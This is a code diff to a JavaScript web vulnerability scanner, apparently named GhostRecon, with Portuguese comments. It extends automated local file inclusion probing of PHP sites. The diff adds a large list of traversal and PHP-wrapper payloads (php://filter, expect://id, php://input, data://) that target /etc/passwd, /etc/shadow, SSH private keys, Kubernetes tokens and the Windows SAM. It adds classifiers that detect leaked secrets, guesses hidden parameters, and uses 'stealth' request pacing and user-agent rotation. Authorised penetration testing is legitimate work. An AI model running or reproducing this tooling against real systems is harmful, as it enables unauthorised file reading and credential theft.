@@ -1,5 +1,7 @@
 import crypto from 'crypto';
+import { Buffer } from 'node:buffer';
 import { stealthPause, pickStealthUserAgent } from './request-policy.js';
+import { attachDecodedExtractions } from './encoding-sniff.js';
 
 const XSS_PARAM_RE = /^(q|query|search|s|keyword|term|message|comment|title|name)$/i;
 export const SQLI_PARAM_RE =
@@ -9,12 +11,226 @@ const LOGIN_PATH_RE = /(\/|^)(login|sign-in|signin|auth)(\/|$)/i;
 const AUTH_SQLI_PARAM_RE = /^(user(name)?|email|pass(word)?|login|pwd)$/i;
 const REDIRECT_PARAM_RE = /^(redirect|url|next|return|return_url|dest|target|goto|callback)$/i;
 const IDOR_PARAM_RE = /^(id|user_id|uid|account|order_id|profile_id|invoice_id)$/i;
-const LFI_PARAM_RE = /^(file|path|page|template|include|inc|doc|document|folder|dir|download|view|cat)$/i;
+const LFI_PARAM_RE =
+  /^(file|path|page|template|include|inc|doc|document|folder|dir|download|view|cat|module|load|read|filepath|filename|lang|locate|show|nav|layout|render|snippet|f|fn|asset|theme|id|ids|nid|pid|cid|aid|noticia|noticias|artigo|artigos|news|post|posts|slug|item|items|tipo|secao|mensagem|chave|story|opcao|pagina|conteudo|arquivo|arq|ver|mod|ref|rel|opc|cont|body|texto|tpl|banner|opcao_menu|menu|sec|image|img|foto|thumb|text|txt|article|msg|load_file)$/i;
+/** Nomes típicos para LFI quando o endpoint é .php e não há query (ou nenhum parâmetro “LFI” na URL). */
+const LFI_SYNTHETIC_PARAMS_FULL = [
+  'text',
+  'id',
+  'noticia',
+  'file',
+  'page',
+  'include',
+  'path',
+  'image',
+  'doc',
+  'document',
+  'lang',
+  'template',
+  'arquivo',
+  'ver',
+];
+const LFI_SYNTHETIC_PARAMS_LIGHT = ['text', 'id', 'noticia', 'file', 'page', 'include', 'path'];
 /** Padrões comuns de erro SQL em respostas HTML/JSON (probe simples com '). */
 const SQL_ERROR_RE =
   /(sql syntax|mysql_fetch|mysqli_(query|sql)|sqlstate\[|PDOException|quoted string not properly terminated|unclosed quotation|syntax error at or near|sqlite error|postgresql|ORA-\d{4,5}|Microsoft OLE DB Provider|ODBC SQL Server Driver|Sybase message|Warning:\s*mysql_|You have an error in your SQL syntax)/i;
 const LFI_UNIX_RE = /(root:x:0:0:|daemon:x:|bin:x:|nobody:x:|\/bin\/bash|\/usr\/sbin\/nologin)/i;
 const LFI_WIN_RE = /(\[extensions\]|\[fonts\]|\[mci extensions\]|for 16-bit app support)/i;
+const LFI_PROC_ENV_RE = /\b(PATH|PWD|USER|HOME|SERVER_SOFTWARE|REQUEST_METHOD|SCRIPT_FILENAME)=/i;
+const LFI_APACHE_CONF_RE = /(ServerRoot|DocumentRoot|<VirtualHost\b|LoadModule\s)/i;
+const LFI_UNATTEND_RE = /<(unattend|unattended|AutoLogon|Password)\b/i;
+/** Marcador único em data://text/plain (sem PHP). */
+export const LFI_DATA_PLAIN_MARKER = 'GHOSTRECON_LFI_DATA_PLAIN_V1';
+/** Conteúdo ASCII em data://;base64 (sem PHP). */
+export const LFI_DATA_B64_INNER = 'GR_LFI_DATA_B64_MSG';
+/** Corpo POST para php://input (sem tags PHP — só texto). */
+export const LFI_PHP_INPUT_POST_MARKER = '___GHOSTRECON_LFI_POST_PROBE_V1___';
+const LFI_PROC_FD_META_RE =
+  /\b(HTTP_HOST|HTTP_USER_AGENT|HTTP_COOKIE|REQUEST_URI|REQUEST_METHOD|SERVER_SOFTWARE|SCRIPT_FILENAME|DOCUMENT_ROOT|CONTENT_TYPE|CONTENT_LENGTH)=/i;
+
+/** Profundidade relativa típica a partir da raiz web. */
+const LFI_TRAV = '../../../../../../../';
+
+/**
+ * Resposta a um GET/POST de verificação LFI: classificação + marcador (para meta / testes).
+ * @param {string} text
+ * @param {string} payload valor injectado no parâmetro
+ * @param {{ postBodyMarker?: string }} [meta] — POST php://input: corpo enviado; se reflectir na resposta, sinal próprio.
+ */
+export function classifyLfiResponse(text, payload, meta = {}) {
+  const t = String(text || '');
+  const p = String(payload || '');
+  if (meta?.postBodyMarker && String(meta.postBodyMarker).length > 6 && t.includes(String(meta.postBodyMarker))) {
+    return { classification: 'probable', marker: 'php-input-body-reflected', score: 78 };
+  }
+  if (p.includes('data:') && t.includes(LFI_DATA_PLAIN_MARKER)) {
+    return { classification: 'probable', marker: 'data-plain-reflect', score: 77 };
+  }
+  if (p.includes('data:') && t.includes(LFI_DATA_B64_INNER)) {
+    return { classification: 'probable', marker: 'data-b64-inner-reflect', score: 77 };
+  }
+  if (p.includes('proc/self/fd') && LFI_PROC_FD_META_RE.test(t.slice(0, 12000)) && t.length < 200000) {
+    return { classification: 'probable', marker: 'proc-fd-http-meta-leak', score: 71 };
+  }
+  if (LFI_UNIX_RE.test(t)) {
+    return { classification: 'confirmed', marker: 'unix-passwd-sig', score: 97 };
+  }
+  if (LFI_WIN_RE.test(t)) {
+    return { classification: 'confirmed', marker: 'win.ini-sig', score: 97 };
+  }
+  if (/BEGIN (OPENSSH|RSA |EC )?PRIVATE KEY/.test(t)) {
+    return { classification: 'confirmed', marker: 'pem-private-key', score: 96 };
+  }
+  if (p.includes('shadow') && /root:\$[0-9$./a-z]{8,}/i.test(t)) {
+    return { classification: 'confirmed', marker: 'etc-shadow-hash', score: 95 };
+  }
+  if (p.includes('serviceaccount') && /(kubernetes\.io|"kind"\s*:\s*"|eyJ[A-Za-z0-9_-]{20,}\.)/i.test(t)) {
+    return { classification: 'confirmed', marker: 'k8s-sa-or-token', score: 94 };
+  }
+  if ((p.includes('php://filter') || p.includes('convert.base64-encode')) && lfiBase64DecodedLooksLikePasswd(t)) {
+    return { classification: 'confirmed', marker: 'php-filter-b64-passwd', score: 97 };
+  }
+  if (p.startsWith('expect://') && /\b(uid|gid|groups)=\d+/i.test(t)) {
+    return { classification: 'confirmed', marker: 'expect-cmd-output', score: 93 };
+  }
+  if (p.includes('127.0.0.1') && /disallow:\s*\S/i.test(t) && /user-agent:/i.test(t)) {
+    return { classification: 'probable', marker: 'rfi-loopback-robots', score: 76 };
+  }
+  if (p.includes('environ') && LFI_PROC_ENV_RE.test(t) && t.length < 120000) {
+    return { classification: 'probable', marker: 'proc-self-environ', score: 74 };
+  }
+  if (p.includes('mounts') && /^\w+\s+\//m.test(t) && /\s\/[\w/]+\s/m.test(t)) {
+    return { classification: 'probable', marker: 'proc-mounts', score: 72 };
+  }
+  if (LFI_APACHE_CONF_RE.test(t) && (p.includes('apache') || p.includes('httpd'))) {
+    return { classification: 'probable', marker: 'apache-conf-leak', score: 73 };
+  }
+  if (LFI_UNATTEND_RE.test(t) && /unattend/i.test(p)) {
+    return { classification: 'probable', marker: 'windows-unattend-xml', score: 75 };
+  }
+  if (p.includes('issue') && /\b(Debian|Ubuntu|Fedora|CentOS|Rocky|Alpine|GNU\/Linux)\b/i.test(t) && t.length < 1200) {
+    return { classification: 'probable', marker: 'etc-issue-like', score: 68 };
+  }
+  if (
+    /(failed to open stream|no such file|failed opening|include\(\)|fopen\(|Failed opening required|Path not allowed|open_basedir restriction|wrapper is disabled|protocol\s+not\s+registered|Unable to find the wrapper)/i.test(
+      t,
+    )
+  ) {
+    return { classification: 'probable', marker: 'include-wrapper-error', score: 70 };
+  }
+  return { classification: 'noisy', marker: 'no-signal', score: 32 };
+}
+
+function lfiBase64DecodedLooksLikePasswd(text) {
+  const s = String(text || '')
+    .replace(/<[^>]+>/g, ' ')
+    .replace(/\s+/g, '');
+  const chunks = s.match(/[A-Za-z0-9+/]{36,}={0,2}/g) || [];
+  for (const chunk of chunks.slice(0, 6)) {
+    try {
+      const dec = Buffer.from(chunk.slice(0, 24000), 'base64').toString('utf8');
+      if (/(^|\n)root:[x*!]:0:0:/im.test(dec) || /(^|\n)(daemon|bin|nobody):[x*!]:/im.test(dec)) {
+        return true;
+      }
+    } catch {
+      /* ignore */
+    }
+  }
+  return false;
+}
+
+function isPhpLikePath(pathname) {
+  return /\.(php[0-9]?|phtml|inc)(?:$|[#/?])/i.test(String(pathname || ''));
+}
+
+function buildLfiVerifyPayloads() {
+  const d = LFI_TRAV;
+  const out = [];
+  const push = (x) => {
+    if (x && out.length < 72) out.push(x);
+  };
+  push('../../../etc/passwd');
+  push('../../../../etc/passwd');
+  push('../../../../../etc/passwd');
+  /** include("files/".$x) — traversal curto + dupla pasta / encoding */
+  push('....//....//etc/passwd');
+  push('../etc/passwd');
+  push('../../etc/passwd');
+  push('files/....//....//etc/passwd');
+  push('files/..%2f..%2f..%2f..%2fetc%2fpasswd');
+  push(`${d}etc/passwd`);
+  push('....//....//....//....//....//....//etc/passwd');
+  push('..%2f..%2f..%2f..%2f..%2fetc%2fpasswd');
+  push('..%252f..%252f..%252f..%252fetc%252fpasswd');
+  push(`php://filter/convert.base64-encode/resource=${d}etc/passwd`);
+  push(`php://filter/read=convert.base64-encode/resource=${d}etc/passwd`);
+  push('php://filter/convert.iconv.UTF8.UTF16LE/resource=../../../../../../../etc/passwd');
+  push('file:///etc/passwd');
+  push('expect://id');
+  push('http://127.0.0.1/robots.txt');
+  push(`data://text/plain,${LFI_DATA_PLAIN_MARKER}`);
+  push(`data://text/plain;base64,${Buffer.from(LFI_DATA_B64_INNER, 'utf8').toString('base64')}`);
+  push(`data:text/plain;charset=US-ASCII,${LFI_DATA_PLAIN_MARKER}`);
+  const relLinux = [
+    'etc/issue',
+    'etc/group',
+    'etc/hostname',
+    'etc/ssh/ssh_config',
+    'etc/ssh/sshd_config',
+    'etc/shadow',
+    'var/log/apache2/access.log',
+    'var/log/apache2/error.log',
+    'var/log/apache/access.log',
+    'var/log/httpd/access_log',
+    'var/log/httpd/error_log',
+    'proc/self/environ',
+    'proc/mounts',
+    'proc/self/fd/0',
+    'proc/self/fd/1',
+    'proc/self/fd/2',
+    'proc/1/fd/0',
+    'root/.ssh/id_rsa',
+    'home/www-data/.ssh/id_rsa',
+    'var/run/secrets/kubernetes.io/serviceaccount/token',
+    'var/lib/mlocate/mlocate.db',
+    'var/lib/mlocate.db',
+  ];
+  for (const rel of relLinux) {
+    push(`${d}${rel}`);
+  }
+  push('..\\..\\..\\..\\..\\windows\\win.ini');
+  push('..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts');
+  push('..\\..\\..\\..\\..\\windows\\system32\\eula.txt');
+  push('..\\..\\..\\..\\..\\windows\\panther\\unattended.xml');
+  push('..\\..\\..\\..\\..\\windows\\panther\\unattend\\unattended.xml');
+  push('..\\..\\..\\..\\..\\boot.ini');
+  push('..\\..\\..\\..\\..\\windows\\repair\\SAM');
+  push(`${d}etc/apache2/apache2.conf`);
+  push(`${d}usr/local/etc/apache2/httpd.conf`);
+  push(`${d}etc/httpd/conf/httpd.conf`);
+  push(`${d}var/lib/mysql/mysql/user.frm`);
+  return out;
+}
+
+const LFI_VERIFY_PAYLOADS = buildLfiVerifyPayloads();
+/** Provas curtas só para parâmetros sintéticos (evita centenas de GET por URL .php). */
+const LFI_VERIFY_PAYLOADS_SYNTH = LFI_VERIFY_PAYLOADS.slice(0, 26);
+
+/**
+ * Decodifica entidades numéricas HTML comuns para não perder `root:x:0:0` escapado em saídas PHP/HTML.
+ */
+export function decodeHtmlNumericEntitiesForLfi(text) {
+  let s = String(text || '');
+  s = s.replace(/&#x([0-9a-f]{1,6});/gi, (full, hex) => {
+    const cp = parseInt(hex, 16);
+    return Number.isFinite(cp) && cp > 8 && cp <= 0x10ffff ? String.fromCodePoint(cp) : full;
+  });
+  s = s.replace(/&#(\d{1,7});/g, (full, dec) => {
+    const cp = parseInt(dec, 10);
+    return Number.isFinite(cp) && cp > 8 && cp <= 0x10ffff ? String.fromCodePoint(cp) : full;
+  });
+  return s;
+}
 
 function nowIso() {
   return new Date().toISOString();
@@ -41,6 +257,21 @@ async function fetchText(url, { auth, timeoutMs = 12000, modules = [] } = {}) {
     redirect: 'manual',
     signal: AbortSignal.timeout(timeoutMs),
     headers: buildHeaders(auth, modules),
+  });
+  const text = await res.text().catch(() => '');
+  return { status: res.status, headers: res.headers, text: text.slice(0, 160000), location: res.headers.get('location') || '' };
+}
+
+/** POST com corpo textual (php://input, uploads simulados). */
+async function fetchPostText(url, body, { auth, timeoutMs = 12000, modules = [] } = {}) {
+  await stealthPause(modules);
+  const headers = { ...buildHeaders(auth, modules), 'Content-Type': 'text/plain; charset=utf-8' };
+  const res = await fetch(url, {
+    method: 'POST',
+    redirect: 'manual',
+    signal: AbortSignal.timeout(timeoutMs),
+    headers,
+    body: String(body ?? ''),
   });
   const text = await res.text().catch(() => '');
   return { status: res.status, headers: res.headers, text: text.slice(0, 160000), location: res.headers.get('location') || '' };
@@ -182,7 +413,7 @@ function collectEndpointUrlsForVerify(findings, maxEndpoints) {
     const m = String(f.value || '').match(/^\?([a-zA-Z_][a-zA-Z0-9_]{0,64})=\s*$/);
     if (!m) continue;
     const pName = m[1];
-    if (!SQLI_PARAM_RE.test(pName)) continue;
+    if (!SQLI_PARAM_RE.test(pName) && !LFI_PARAM_RE.test(pName)) continue;
     try {
       const u = new URL(f.url);
       if (u.searchParams.has(pName)) urls.add(f.url);
@@ -193,13 +424,27 @@ function collectEndpointUrlsForVerify(findings, maxEndpoints) {
   return [...urls].slice(0, cap);
 }
 
-function pushVerificationFinding(out, kind, classification, score, value, meta, evidence) {
+function pushVerificationFinding(out, kind, classification, score, value, meta, evidence, responseTextForDecode) {
+  if (typeof responseTextForDecode === 'string' && responseTextForDecode.length > 24) {
+    attachDecodedExtractions(evidence, responseTextForDecode, { maxPerKind: 2, maxUtf8: 4000 });
+  }
+  let metaOut = meta;
+  if (evidence?.decodedExtractions?.length) {
+    const bits = evidence.decodedExtractions
+      .map((d, i) => {
+        const flat = d.decodedUtf8.replace(/\s+/g, ' ').trim();
+        const sn = flat.length > 220 ? `${flat.slice(0, 220)}…` : flat;
+        return `[${i + 1}:${d.encoding} ${d.decodedBytes}B] ${sn}`;
+      })
+      .join(' · ');
+    metaOut = `${meta} • decoded_snippets=${bits.slice(0, 2000)}`;
+  }
   out.push({
     type: kind,
     prio: classification === 'confirmed' ? 'high' : classification === 'probable' ? 'med' : 'low',
     score,
     value,
-    meta,
+    meta: metaOut,
     verification: {
       classification,
       evidence: { ...evidence, evidenceHash: evidenceHash(evidence) },
@@ -207,6 +452,98 @@ function pushVerificationFinding(out, kind, classification, score, value, meta, 
     },
     url: evidence?.url || null,
   });
+}
+
+/**
+ * Provas LFI GET (lista de payloads) + POST php://input se não houver confirmação GET.
+ * @param {{ payloadSet?: 'full' | 'synth' }} [opts] — `synth`: lista curta e sem POST php://input (probes em parâmetros inventados).
+ * @returns {Promise<boolean>} true se LFI confirmado via GET
+ */
+async function runLfiVerificationOnParam(u, paramKey, out, auth, modules, opts = {}) {
+  const p = String(paramKey);
+  const synth = opts.payloadSet === 'synth';
+  const payloads = synth ? LFI_VERIFY_PAYLOADS_SYNTH : LFI_VERIFY_PAYLOADS;
+  let lfiGetConfirmed = false;
+  for (const payload of payloads) {
+    const x = new URL(u.href);
+    x.searchParams.set(p, payload);
+    try {
+      const r = await fetchText(x.href, { auth, modules });
+      const scanText = decodeHtmlNumericEntitiesForLfi(r.text);
+      const { classification, marker, score } = classifyLfiResponse(scanText, payload);
+      let needle = '';
+      if (LFI_UNIX_RE.test(scanText) || lfiBase64DecodedLooksLikePasswd(scanText)) needle = 'root:';
+      else if (LFI_WIN_RE.test(scanText)) needle = '[extensions]';
+      else if (/BEGIN (OPENSSH|RSA |EC )?PRIVATE KEY/.test(scanText)) needle = 'BEGIN';
+      else if (marker === 'expect-cmd-output') needle = 'uid=';
+      else if (marker === 'k8s-sa-or-token') needle = 'kubernetes';
+      else if (marker === 'etc-shadow-hash') needle = 'root:$';
+      else if (marker === 'rfi-loopback-robots') needle = 'Disallow';
+      else if (marker === 'include-wrapper-error') needle = 'stream';
+      else if (marker === 'proc-self-environ') needle = 'PATH=';
+      else if (marker === 'data-plain-reflect' || marker === 'data-b64-inner-reflect') needle = 'GHOSTRECON';
+      else if (marker === 'proc-fd-http-meta-leak') needle = 'HTTP_';
+      else if (marker === 'php-input-body-reflected') needle = LFI_PHP_INPUT_POST_MARKER.slice(0, 20);
+      else if (payload.includes('passwd')) needle = 'root';
+      pushVerificationFinding(
+        out,
+        'lfi',
+        classification,
+        score,
+        `Verify LFI ${classification.toUpperCase()} @ ${x.pathname} ?${p}=`,
+        `verify=lfi • param=${p} • payload=${payload.slice(0, 56)} • marker=${marker} • confidence=${classification}`,
+        {
+          source: 'verify-lfi',
+          url: x.href,
+          method: 'GET',
+          status: r.status,
+          requestSnippet: `${x.pathname}?${p}=${payload.slice(0, 200)}`,
+          responseSnippet: sampleSnippet(scanText, needle || (payload.includes('passwd') ? 'root' : '')),
+          timestamp: nowIso(),
+        },
+        r.text,
+      );
+      if (classification === 'confirmed') {
+        lfiGetConfirmed = true;
+        break;
+      }
+    } catch {
+      /* ignore */
+    }
+  }
+  if (!lfiGetConfirmed && !synth) {
+    try {
+      const xIn = new URL(u.href);
+      xIn.searchParams.set(p, 'php://input');
+      const rIn = await fetchPostText(xIn.href, `${LFI_PHP_INPUT_POST_MARKER}\n`, { auth, modules });
+      const inClass = classifyLfiResponse(rIn.text, 'php://input', {
+        postBodyMarker: LFI_PHP_INPUT_POST_MARKER,
+      });
+      if (inClass.classification !== 'noisy') {
+        pushVerificationFinding(
+          out,
+          'lfi',
+          inClass.classification,
+          inClass.score,
+          `Verify LFI ${inClass.classification.toUpperCase()} @ ${xIn.pathname} ?${p}= (POST php://input)`,
+          `verify=lfi • param=${p} • method=POST • wrapper=php://input • marker=${inClass.marker} • confidence=${inClass.classification}`,
+          {
+            source: 'verify-lfi-php-input',
+            url: xIn.href,
+            method: 'POST',
+            status: rIn.status,
+            requestSnippet: `POST ${xIn.pathname}?${p}=php://input body=${LFI_PHP_INPUT_POST_MARKER}`,
+            responseSnippet: sampleSnippet(rIn.text, LFI_PHP_INPUT_POST_MARKER.slice(0, 16)),
+            timestamp: nowIso(),
+          },
+          rIn.text,
+        );
+      }
+    } catch {
+      /* ignore */
+    }
+  }
+  return lfiGetConfirmed;
 }
 
 export async function runEvidenceVerification({ findings, auth, log, maxEndpoints = 36, modules = [] }) {
@@ -224,7 +561,9 @@ export async function runEvidenceVerification({ findings, auth, log, maxEndpoint
       continue;
     }
     const params = [...u.searchParams.keys()].slice(0, 8);
-    if (!params.length) continue;
+    const triedKeys = new Set(params.map((k) => String(k).toLowerCase()));
+    let lfiConfirmedOnUrl = false;
+    const phpLfi = isPhpLikePath(u.pathname);
 
     for (const p of params) {
       const param = String(p || '').toLowerCase();
@@ -257,6 +596,7 @@ export async function runEvidenceVerification({ findings, auth, log, maxEndpoint
               responseSnippet: sampleSnippet(r.text, marker),
               timestamp: nowIso(),
             },
+            r.text,
           );
         } catch {
           /* ignore */
@@ -314,6 +654,7 @@ export async function runEvidenceVerification({ findings, auth, log, maxEndpoint
               responseSnippet: sqlErrorResponseSnippet(rt.text),
               timestamp: nowIso(),
             },
+            rt.text,
           );
         } catch {
           /* ignore */
@@ -346,6 +687,7 @@ export async function runEvidenceVerification({ findings, auth, log, maxEndpoint
               responseSnippet: loc || sampleSnippet(r.text, 'example.org'),
               timestamp: nowIso(),
             },
+            r.text,
           );
         } catch {
           /* ignore */
@@ -383,6 +725,7 @@ export async function runEvidenceVerification({ findings, auth, log, maxEndpoint
               responseSnippet: sampleSnippet(rt.text, ''),
               timestamp: nowIso(),
             },
+            rt.text,
           );
         } catch {
           /* ignore */
@@ -390,47 +733,17 @@ export async function runEvidenceVerification({ findings, auth, log, maxEndpoint
       }
 
       if (LFI_PARAM_RE.test(param)) {
-        const payloads = [
-          '../../../../../../../etc/passwd',
-          '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
-          '..%252f..%252f..%252f..%252fetc%252fpasswd',
-          '..\\..\\..\\..\\..\\windows\\win.ini',
-        ];
-        for (const payload of payloads) {
-          const x = new URL(u.href);
-          x.searchParams.set(p, payload);
-          try {
-            const r = await fetchText(x.href, { auth, modules });
-            const unixHit = LFI_UNIX_RE.test(r.text);
-            const winHit = LFI_WIN_RE.test(r.text);
-            const hasTraversalError = /(failed to open stream|no such file|permission denied|include\(\)|fopen\()/i.test(
-              r.text,
-            );
-            const classification = unixHit || winHit ? 'confirmed' : hasTraversalError ? 'probable' : 'noisy';
-            const score = classification === 'confirmed' ? 97 : classification === 'probable' ? 70 : 30;
-            const marker = unixHit ? 'etc/passwd signature' : winHit ? 'win.ini signature' : 'error-pattern';
-            pushVerificationFinding(
-              out,
-              'lfi',
-              classification,
-              score,
-              `Verify LFI ${classification.toUpperCase()} @ ${x.pathname} ?${p}=`,
-              `verify=lfi • param=${p} • payload=${payload.slice(0, 40)} • marker=${marker} • confidence=${classification}`,
-              {
-                source: 'verify-lfi',
-                url: x.href,
-                method: 'GET',
-                status: r.status,
-                requestSnippet: `${x.pathname}?${p}=${payload}`,
-                responseSnippet: sampleSnippet(r.text, unixHit ? 'root:x:' : winHit ? '[extensions]' : 'failed'),
-                timestamp: nowIso(),
-              },
-            );
-            if (classification === 'confirmed') break;
-          } catch {
-            /* ignore */
-          }
-        }
+        const ok = await runLfiVerificationOnParam(u, p, out, auth, modules);
+        if (ok) lfiConfirmedOnUrl = true;
+      }
+    }
+
+    if (phpLfi && !lfiConfirmedOnUrl) {
+      const pool = params.length === 0 ? LFI_SYNTHETIC_PARAMS_FULL : LFI_SYNTHETIC_PARAMS_LIGHT;
+      const maxSynth = params.length === 0 ? 12 : 6;
+      const extras = pool.filter((sp) => !triedKeys.has(String(sp).toLowerCase())).slice(0, maxSynth);
+      for (const sp of extras) {
+        if (await runLfiVerificationOnParam(u, sp, out, auth, modules, { payloadSet: 'synth' })) break;
       }
     }
   }
@@ -487,6 +800,7 @@ export async function runMicroExploitVariants({ findings, auth, log, modules = [
           responseSnippet: sampleSnippet(r.text, 'svg'),
           timestamp: nowIso(),
         },
+        r.text,
       );
       count++;
     } catch {
